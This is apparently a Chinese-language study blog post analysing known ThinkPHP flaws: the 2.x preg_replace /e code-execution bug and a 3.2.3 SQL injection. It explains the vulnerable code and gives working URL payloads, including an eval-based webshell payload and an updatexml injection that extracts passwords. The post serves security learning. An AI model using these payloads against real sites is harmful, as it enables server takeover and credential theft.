---
title: thinkphp框架
id: thinkphp框架
---

<!-- more -->

太久没学习了。。就打算学习一下thinkphp这个框架，简单跟着人家审计一下







# ThinkPHP 2.x 任意代码执行漏洞



- php版本<=5.6.29

- 成因是preg_replace()使用了修饰符/e匹配路由，导致用户的输入参数被插入双引号中执行，造成任意代码执行漏洞。

  ThinkPHP 3.0版本因为Lite模式下没有修复该漏洞，也存在这个漏洞。
  
  ```php
  #./ThinkPHP/Lib/Think/Util/Dispatcher.class.php:102: 
  $res = preg_replace('@(\w+)'.$depr.'([^'.$depr.'\/]+)@e', '$var[\'\\1\']="\\2";', implode($depr,$paths));
  ```
  

学习文章：

[ThinkPHP系列漏洞之ThinkPHP 2.x 任意代码执行 - FreeBuf网络安全行业门户](https://www.freebuf.com/sectool/223149.html)

[PHP-Audit-Labs/README.md at master · hongriSec/PHP-Audit-Labs (github.com)](https://github.com/hongriSec/PHP-Audit-Labs/blob/master/Part1/Day8/files/README.md)

[深入研究preg_replace与代码执行 - 先知社区 (aliyun.com)](https://xz.aliyun.com/t/2557)



俺的理解：

```php
$res = preg_replace('@(\w+)'.$depr.'([^'.$depr.'\/]+)@e', '$var[\'\\1\']="\\2";', implode($depr,$paths));
```

1、preg_replace — 执行正则表达式的搜索和替换

> ```php
>mixed preg_replace ( mixed $pattern , mixed $replacement , mixed $subject [, int $limit ] )
> # 在 subject 中搜索 pattern 模式的匹配项并替换为 replacement 。
> # 如果指定了 limit ，则仅替换 limit 个匹配，如果省略 limit 或者其值为 -1，则所有的匹配项都会被替换。
> ```
> 
> 而/e修正符会让preg_replace()将replacement参数当作php代码执行
>(当然要确保replacement构成合法的php代码字符串，否则会PHP会报告在包含 preg_replace() 的行中出现语法解析错误)

此处`'$var[\'\\1\']="\\2";'`即为replacement

2、表达式反向引用

`\1`和`\2`为反向引用，分别指向的是第一个和第二个子匹配项

> **反向引用** [正则表达式 – 语法_w3cschool](https://www.w3cschool.cn/zhengzebiaodashi/regexp-syntax.html)
>
> 对一个正则表达式模式或部分模式 **两边添加圆括号** 将导致相关 **匹配存储到一个临时缓冲区** 中，所捕获的每个子匹配都按照在正则表达式模式中从左到右出现的顺序存储。缓冲区编号从 1 开始，最多可存储 99 个捕获的子表达式。每个缓冲区都可以使用 '\n' 访问，其中 n 为一个标识特定缓冲区的一位或两位十进制数。

3、php可变变量

> 在PHP中双引号包裹的字符串中可以解析变量，而单引号则不行。
> `${phpinfo()}` 中的 **phpinfo()** 会被当做变量先执行，执行后，即变成 `${1}` (phpinfo()成功执行返回true)。



```php
$res = preg_replace('@(\w+)'.$depr.'([^'.$depr.'\/]+)@e',
 '$var[\'\\1\']="\\2";',
 implode($depr,$paths));
```

回到Thinkphp代码中来，



正则`(\w+)([^/]+)`表示每次匹配路径的2个参数



`implode($depr,$paths)`，implode()将数组拼接为字符串



结合起来就是每次匹配2个参数，第一个参数作为数组键名，第二个作为数组键值



而路径`$paths`可控，就可以实现代码执行



这里要注意的是：

- 实验时路径要用双引号闭合才能解析变量，单引号不行；而implode()函数
- 代码执行的位置，必须是键值的位置，而非键名



> [ThinkPHP系列漏洞之ThinkPHP 2.x 任意代码执行 - FreeBuf网络安全行业门户](https://www.freebuf.com/sectool/223149.html)
>
> ```php
> <?php
> $var = array();
> $a='$var[\'\\1\']="\\2";';
> $b='a/b/c/d/e/f';
> preg_replace("/(\w+)\/([^\/\/])/ies",$a,$b);
> 
> print_r($var);
> 
> 运行结果：
> Array
> (
>  [a] => b
>  [c] => d
>  [e] => f
> )
> 
> # $b="a/{${phpversion()}}/c/d/e/f";
> 
> 运行结果：
> Notice:  Undefined variable: 5.4.6 in [...][...]on line 5
> Array
> (
>  [c] => d
>  [e] => f
> )
> ```
>
> ![](https://s2.loli.net/2022/03/17/bkoiEeCjJvWNXc6.png)

由此可构造payload：

```
/index.php?s=a/b/c/${phpinfo()}
/index.php?s=a/b/c/${phpinfo()}/c/d/e/f
/index.php?s=a/b/c/d/e/${phpinfo()}

rce:
/index.php?s=a/b/c/${@print(eval($_POST[1]))}
```











# Thinkphp3

[ThinkPHP3.2.3完全开发手册](https://www.kancloud.cn/manual/thinkphp/1678)

> thinkphp3版本路由格式:
>
> ```
> http://serverName/index.php/模块/控制器/方法/参数
> ```

[ThinkPHP3.2.3SQL注入分析 - Pan3a - 博客园 (cnblogs.com)](https://www.cnblogs.com/Pan3a/p/14873308.html)

## Thinkphp3.2.3 SQL注入

### where

payload:

```
?id[where]=1 and 1=updatexml(1,concat(0x7e,(select password from users limit 1),0x7e),1)%23
```













